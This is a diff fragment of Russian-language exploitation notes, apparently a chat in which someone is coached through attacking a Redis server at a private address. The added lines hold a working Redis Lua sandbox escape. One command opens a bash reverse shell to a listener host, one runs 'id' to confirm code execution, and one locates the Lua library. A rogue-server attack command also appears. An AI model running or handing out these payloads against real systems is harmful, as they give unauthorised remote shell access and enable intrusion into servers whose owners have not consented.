@@ -345,3 +345,17 @@ python3 redis-rogue-server.py --rhost 10.50.120.79 --lhost <ТВОЙ_IP>
 
 Погнали. Пробуй. Если что-то пойдёт не так — показывай вывод Redis, будем разбираться дальше.
 
+
+```
+# Твой IP для reverse shell (замени на свой)
+redis-cli -h 10.50.120.79 -p 6380 -a myredissecret EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -c \"bash -i >& /dev/tcp/10.50.12.42/4444 0>&1\"", "r"); return "OK"' 0
+```
+
+```
+# Проверка уязвимости — выполнить 'id' команду
+eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
+```
+
+```
+eval 'local f = io.popen("find / -name liblua*.so 2>/dev/null", "r"); local res = f:read("*a"); f:close(); return res' 0
+```
